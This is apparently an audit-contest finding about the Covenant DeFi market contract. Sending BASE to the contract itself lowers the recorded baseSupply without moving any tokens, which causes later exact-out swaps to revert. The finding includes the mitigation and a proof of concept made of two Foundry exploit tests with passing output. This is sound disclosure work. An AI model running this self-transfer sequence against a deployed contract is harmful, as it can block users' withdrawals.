  "body": "## Finding description and impact\n\n`Covenant` keeps its own ledger of how many BASE tokens the market holds in `marketState.baseSupply`. When BASE is sent out (via `redeem` or `swap` with `assetOut == BASE`), the code first decrements `baseSupply` by the amount and then transfers the tokens to `to`. There’s no special-case for self-transfers (`to == address(this)`).\n\nIf a user sets `to = Covenant` itself, the ERC-20 transfer is effectively a no-op (tokens go from Covenant to Covenant), but `baseSupply` still gets reduced. That creates a mismatch:\n\n```\nERC20(base).balanceOf(Covenant)   – unchanged\nCovenant.marketState.baseSupply   – decreased by `amount`\n```\n\nValidation in `ValidationLogic.checkSwapOutputs` caps BASE outflows by comparing `(requested + fees)` against `baseSupply` (not the actual token balance). After you “deflate” `baseSupply` with a self-transfer, exact-out BASE requests that should succeed will now revert with `Errors.E_InsufficientAmount`. In practice, anyone holding zTokens can do a `DEBT -> BASE` swap to `to = Covenant` and brick subsequent withdrawals (and any other flows that rely on `baseSupply`) until the mismatch is repaired by other activity.\n\nto execute the attack, \n* No special roles or governance needed.\n* Works with standard tokens.\n* Can be repeated to drive `baseSupply` arbitrarily low (up to the attacker’s zToken budget), turning a nuisance into a sustained DoS.\n\n\n## Recommended mitigation steps\n\n**Block self-transfers on BASE-out paths** (simple, low risk):\n\n```solidity\n// In Covenant.redeem (BASE out):\nrequire(redeemParams.to != address(this), \"no self BASE transfer\");\n\n// In Covenant.swap, assetOut == BASE branch:\nrequire(swapParams.to != address(this), \"no self BASE transfer\");\n```",
  "proof_of_concept": "1. Seed the market with a normal `mint` so Covenant holds BASE and `baseSupply > 0`.\n2. Swap `DEBT -> BASE` with `to = address(covenant)`.\n   Result: ERC-20 balance unchanged; `baseSupply` drops by `baseOut`.\n3. Try an exact-out BASE swap with `amountSpecified = deflatedBaseSupply + 1`.\n   It reverts with `Errors.E_InsufficientAmount` even though the contract actually has enough BASE.\n\nPaste the following two tests in `C4PoC.t.sol`\n* `test_BH19_BaseSupplyDeflatesOnSelfTransfer` shows the mismatch.\n* `test_BH19_DoS_AfterDeflate_ExactOutBASEReverts` shows the DoS.\n\n\n```solidity\nfunction test_BH19_BaseSupplyDeflatesOnSelfTransfer() public {\n    // --- Arrange: seed liquidity with MINT (not swap) ---\n    uint256 seedIn = 10e18;\n    IERC20(_mockBaseAsset).approve(address(covenant), type(uint256).max);\n\n    MarketParams memory mp = MarketParams({\n        baseToken: _mockBaseAsset,\n        quoteToken: _mockQuoteAsset,\n        curator: _mockOracle,\n        lex: address(lex)\n    });\n\n    // Bootstrap: mint a/z to this test addr; baseSupply increases; BASE moved into Covenant\n    MintParams memory m = MintParams({\n        marketId: _marketId,\n        marketParams: mp,\n        baseAmountIn: seedIn,\n        to: address(this),\n        minATokenAmountOut: 0,\n        minZTokenAmountOut: 0,\n        data: hex\"\",\n        msgValue: 0\n    });\n    covenant.mint(m);\n\n    // Cache state before exploit\n    MarketState memory beforeState = covenant.getMarketState(_marketId);\n    uint256 balBefore = IERC20(_mockBaseAsset).balanceOf(address(covenant));\n    assertGt(beforeState.baseSupply, 0, \"seed failed\");\n    // with 0 protocol fees in this setup, balances should match\n    assertEq(balBefore, beforeState.baseSupply, \"pre invariant\");\n\n    // Find zToken minted to us\n    SynthTokens memory toks = ILiquidExchangeModel(address(lex)).getSynthTokens(_marketId);\n    uint256 zBal = IERC20(toks.zToken).balanceOf(address(this));\n    assertGt(zBal, 0, \"need DEBT from mint\");\n    IERC20(toks.zToken).approve(address(lex), type(uint256).max);\n\n    // --- Act: exploit via BASE-out to self (no-op transfer) ---\n    uint256 zIn = zBal / 4 + 1;\n    SwapParams memory spExploit = SwapParams({\n        marketId: _marketId,\n        marketParams: mp,\n        assetIn: AssetType.DEBT,\n        assetOut: AssetType.BASE,\n        to: address(covenant),   // CRITICAL: self-transfer\n        amountSpecified: zIn,\n        amountLimit: 0,\n        isExactIn: true,\n        data: hex\"\",\n        msgValue: 0\n    });\n\n    uint256 baseOut = covenant.swap(spExploit); // succeeds now that liquidity exists\n\n    // --- Assert: ERC20 balance unchanged, baseSupply decreased ---\n    MarketState memory afterState = covenant.getMarketState(_marketId);\n    uint256 balAfter = IERC20(_mockBaseAsset).balanceOf(address(covenant));\n    assertEq(balAfter, balBefore, \"ERC20 balance should be unchanged (self-transfer)\");\n    // protocol fees are zero in this test config; if non-zero, subtract them accordingly\n    assertEq(afterState.baseSupply, beforeState.baseSupply - baseOut, \"baseSupply deflates by out amount\");\n}\n\n\nfunction test_BH19_DoS_AfterDeflate_ExactOutBASEReverts() public {\n    // Bootstrap with mint\n    uint256 seedIn = 10e18;\n    IERC20(_mockBaseAsset).approve(address(covenant), type(uint256).max);\n\n    MarketParams memory mp = MarketParams({\n        baseToken: _mockBaseAsset,\n        quoteToken: _mockQuoteAsset,\n        curator: _mockOracle,\n        lex: address(lex)\n    });\n\n    MintParams memory m = MintParams({\n        marketId: _marketId,\n        marketParams: mp,\n        baseAmountIn: seedIn,\n        to: address(this),\n        minATokenAmountOut: 0,\n        minZTokenAmountOut: 0,\n        data: hex\"\",\n        msgValue: 0\n    });\n    covenant.mint(m);\n\n    // Deflate baseSupply via one self-transfer BASE-out swap\n    SynthTokens memory toks = ILiquidExchangeModel(address(lex)).getSynthTokens(_marketId);\n    IERC20(toks.zToken).approve(address(lex), type(uint256).max);\n    uint256 zBal = IERC20(toks.zToken).balanceOf(address(this));\n    uint256 zIn = zBal / 5 + 1;\n\n    SwapParams memory spExploit = SwapParams({\n        marketId: _marketId,\n        marketParams: mp,\n        assetIn: AssetType.DEBT,\n        assetOut: AssetType.BASE,\n        to: address(covenant),   // self-transfer\n        amountSpecified: zIn,\n        amountLimit: 0,\n        isExactIn: true,\n        data: hex\"\",\n        msgValue: 0\n    });\n    covenant.swap(spExploit);\n\n    // Read deflated baseSupply\n    uint256 deflated = covenant.getMarketState(_marketId).baseSupply;\n    assertGt(deflated, 0, \"still non-zero after one deflate\");\n\n    // Now exact-out BASE slightly above deflated baseSupply -> Validation should reject\n    uint256 wantOut = deflated + 1;\n    SwapParams memory spFail = SwapParams({\n        marketId: _marketId,\n        marketParams: mp,\n        assetIn: AssetType.DEBT,\n        assetOut: AssetType.BASE,\n        to: address(this),\n        amountSpecified: wantOut,      // exactOut\n        amountLimit: type(uint256).max,\n        isExactIn: false,\n        data: hex\"\",\n        msgValue: 0\n    });\n\n    vm.expectRevert(Errors.E_InsufficientAmount.selector);\n    covenant.swap(spFail);\n}\n```\n\nThe tests should pass\n\n```bash\nRan 2 tests for test/poc/C4PoC.t.sol:CovenantTest\n[PASS] test_BH19_BaseSupplyDeflatesOnSelfTransfer() (gas: 402598)\n[PASS] test_BH19_DoS_AfterDeflate_ExactOutBASEReverts() (gas: 404360)\nSuite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.07ms (3.32ms CPU time)\n\nRan 1 test suite in 17.28ms (5.07ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)\n```",
